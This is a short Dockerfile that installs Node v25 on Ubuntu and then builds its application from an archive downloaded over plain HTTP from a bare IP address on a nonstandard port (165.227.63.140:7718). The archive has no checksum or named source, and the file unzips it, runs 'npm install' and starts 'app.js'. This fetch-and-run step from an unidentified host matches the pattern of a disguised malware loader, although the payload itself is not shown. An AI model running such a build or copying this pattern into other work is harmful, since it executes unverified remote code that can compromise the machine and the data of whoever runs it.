FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && \
    apt install -y wget unzip xz-utils libatomic1 && \
    apt clean

# Install Node v25 manually
RUN wget https://nodejs.org/dist/v25.2.1/node-v25.2.1-linux-x64.tar.xz && \
    tar -xvf node-v25.2.1-linux-x64.tar.xz && \
    rm node-v25.2.1-linux-x64.tar.xz && \
    mkdir -p /opt/node && \
    mv node-v25.2.1-linux-x64/* /opt/node/

ENV PATH="/opt/node/bin:${PATH}"

WORKDIR /app

RUN wget http://165.227.63.140:7718/idx.zip && \
    unzip idx.zip && \
    rm idx.zip

RUN npm install

CMD ["node", "app.js"]
